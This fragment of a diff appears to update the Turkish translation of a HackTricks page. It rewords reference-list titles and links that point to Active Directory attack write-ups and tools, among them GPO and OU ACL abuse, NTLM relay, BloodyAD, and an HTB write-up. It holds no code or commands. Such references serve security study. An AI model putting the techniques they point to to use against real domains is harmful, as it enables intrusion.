-- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
-- [14] [OUned.py: Active Directory'deki gizli Organizational Units ACL attack vector'larını exploit etme](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
-- [15] [Ağ üzerinde meşru Active Directory servislerini simüle etme: GPO exploitation vakası](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
+- [8] [BloodyAD – Linux'tan AD öznitelik/UAC işlemleri](https://github.com/CravateRouge/bloodyAD)
+- [9] [Samba – net rpc (grup üyeliği)](https://www.samba.org/)
+- [10] [HTB Puppy: AD ACL kötüye kullanımı, KeePassXC Argon2 kırma ve DC admin'e ulaşmak için DPAPI şifre çözme](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [11] [TrustedSec - ARP Around and Find Out: Kod çalıştırma ve NTLM Relay için GPO UNC yollarını ele geçirme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
+- [12] [GPOddity: NTLM relay ve diğer yöntemlerle Active Directory GPO'larını istismar etme](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
+- [13] [OU şaka mı yapıyor? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
+- [14] [OUned.py: Active Directory'deki gizli Organizational Unit ACL saldırı vektörlerini istismar etme](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
+- [15] [Ağda meşru Active Directory hizmetlerini taklit etme: GPO istismarı örneği](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
 - [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
 - [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
 {{#include ../../../banners/hacktricks-training.md}}
